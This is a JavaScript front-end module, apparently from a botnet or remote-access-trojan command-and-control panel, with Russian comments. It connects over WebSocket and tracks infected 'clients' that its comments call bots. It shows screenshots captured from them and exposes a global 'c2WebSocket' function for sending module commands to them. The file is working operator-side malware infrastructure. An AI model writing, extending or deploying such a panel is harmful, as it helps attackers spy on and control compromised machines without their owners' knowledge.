import { updateClient, updateClients, setClientPreview } from '../data/clients.js';
import { decodePacket, encodePacket } from './protocol.js';

let ws, pingInterval;
const decoder = new TextDecoder();

const sendPing = (id) => ws?.readyState === 1 && ws.send(encodePacket(id, "Heartbeat", "ping"));

export function connectWebSocket() {
    const token = localStorage.getItem('auth_token');
    const login = localStorage.getItem('user_login');
    if (!token || !login) return;

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${prot}//${location.host}/ws?login=${encodeURIComponent(login)}&token=${token}`);
    ws.binaryType = 'arraybuffer';

    ws.onopen = () => {
        console.log("🚀 [WS] Connected");
        if (pingInterval) clearInterval(pingInterval);
        pingInterval = setInterval(() => sendPing(""), 7000); // Чуть увеличили интервал пинга
    };

    ws.onmessage = ({ data }) => {
        if (!(data instanceof ArrayBuffer)) return;
        const pkg = decodePacket(data);
        if (!pkg) return;

        if (pkg.module === 'pong') return;

        if (pkg.module === 'Heartbeat') {
            return updateClient({ id: pkg.id }, true); 
        }

        if (pkg.module === 'DataScribe') {
            try {
                const textData = decoder.decode(pkg.payload);
                
                if (textData.trim().startsWith('{') || textData.trim().startsWith('[')) {
                    const raw = JSON.parse(textData);
                    if (Array.isArray(raw)) {
                        // Это массив при входе (БД + Статус)
                        updateClients(raw);
                    } else {
                        // Это обновление от конкретного бота
                        updateClient({ ...raw, id: pkg.id || raw.id }, true);
                    }
                } else {
                    throw new Error("Not a JSON");
                }
            } catch (e) {
                // ОБРАБОТКА СКРИНШОТА
                if (pkg.payload.byteLength > 100) {
                    const blob = new Blob([pkg.payload], { type: 'image/jpeg' });
                    const url = URL.createObjectURL(blob);
                    
                    // Обновляем в сторе (там сработает revokeObjectURL)
                    setClientPreview(pkg.id, url);
                    
                    const imgEl = document.getElementById(`prev-${pkg.id}`);
                    if (imgEl) {
                        imgEl.src = url;
                        imgEl.style.opacity = "1";
                    }
                }
            }
        }
    };

    const cleanup = () => {
        if (pingInterval) clearInterval(pingInterval);
        setTimeout(connectWebSocket, 5000);
    };

    ws.onclose = cleanup;
    ws.onerror = cleanup;

    window.c2WebSocket = { send: (id, mod, pay) => ws?.readyState === 1 && ws.send(encodePacket(id, mod, pay)) };
}